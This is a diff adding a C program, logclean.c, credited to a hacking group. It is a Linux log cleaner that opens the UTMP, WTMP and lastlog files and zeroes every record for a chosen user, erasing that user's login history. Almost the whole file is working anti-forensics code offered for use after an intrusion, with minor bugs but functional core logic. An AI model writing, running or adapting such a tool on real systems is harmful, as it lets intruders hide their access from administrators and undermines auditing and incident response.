@@ -1,0 +1,127 @@
+/*
+ * logclean.c by CoKi <coki@nosystem.com.ar>
+ *
+ * This tool cleans WTMP, UTMP and lastlog for linux
+ *
+ * No System Group - http://www.nosystem.com.ar
+ *
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <utmp.h>
+#include <getopt.h>
+#include <lastlog.h>
+#include <pwd.h>
+
+#define VERSION "0.1"
+
+int uwtmp_clean(char *path, char *user);
+int lastlog_clean(char *path, char *user);
+void use(char *program);
+void version(void);
+
+int main(int argc, char *argv[]) {
+	char user[UT_LINESIZE];
+	char c;
+
+	while((c = getopt(argc, argv, "vu:")) != EOF) {
+		switch(c) {
+			case 'v':
+				version();
+	            break;
+			case 'u':
+				if(strlen(optarg) > UT_LINESIZE) {
+					printf("user name too long\n");
+					exit(0);
+				}
+				snprintf(user, sizeof(user), "%s", optarg);
+				break;
+			default :
+				use(argv[0]);
+				break;
+		}
+	}
+
+	if(user == NULL || argc < 2) {
+		use(argv[0]);
+	}
+
+	printf(" UTMP:\t\t");
+	fflush(stdout);
+	uwtmp_clean(_PATH_UTMP, user);
+
+	printf(" WTMP:\t\t");
+	fflush(stdout);
+	uwtmp_clean(_PATH_WTMP, user);
+
+	printf(" LASTLOG:\t");
+	fflush(stdout);
+	lastlog_clean(_PATH_LASTLOG, user);
+}
+
+int uwtmp_clean(char *path, char *user) {
+	FILE *uwtmp_file;
+	struct utmp uwtmp_tmp;
+	int count=0;
+
+	if((uwtmp_file = fopen(path, "r+")) == NULL) {
+		printf("[-] filed to open file '%s'\n", path);
+		return 0;
+	}
+  
+	while(fread((char *)&uwtmp_tmp, sizeof(uwtmp_tmp), 1, uwtmp_file) > 0) {
+		if(strcmp(uwtmp_tmp.ut_name, user) ==0) {
+			fseek(uwtmp_file, -sizeof(uwtmp_tmp), SEEK_CUR);
+			bzero(&uwtmp_tmp, sizeof(uwtmp_tmp));
+			fwrite((char *)&uwtmp_tmp, sizeof(uwtmp_tmp), 1, uwtmp_file);
+			count++;
+		}
+	}
+  
+	fclose(uwtmp_file);
+  
+	if(count == 0) {
+		printf("[-] user '%s' not found\n", user, path);
+	}
+  
+	else printf("[+] '%s' cleaned!\n", path);
+
+}
+
+int lastlog_clean(char *path, char *user) {
+	FILE *lastlog_file;
+	struct passwd *pwd;
+	struct lastlog lastlog_tmp;
+	int count=0;
+
+	if((lastlog_file = fopen(path, "r+")) == NULL) {
+		printf("[-] filed to open file '%s'\n", path);
+		return 0;
+	}
+
+	if ((pwd = getpwnam(user)) == NULL) {
+       printf("[-] user '%s' not found\n", user);
+       return 0;
+    }
+
+	fseek(lastlog_file, (long)(pwd->pw_uid*sizeof(lastlog_tmp)), SEEK_SET);
+	bzero((char *)&lastlog_tmp, sizeof(lastlog_tmp));
+	fwrite((char *)&lastlog_tmp, sizeof(lastlog_tmp), 1, lastlog_file);
+
+	fclose(lastlog_file);
+
+	printf("[+] '%s' cleaned!\n", path);
+
+}
+
+void use(char *program) {
+	printf(" use: %s -u\tuser\n", program);
+	printf("\t\t -v\tversion\n");
+	exit(0);
+}
+
+void version(void) {
+	printf(" logclean.c v%s by CoKi <coki@nosystem.com.ar>\n", VERSION);
+	exit(0);
+}
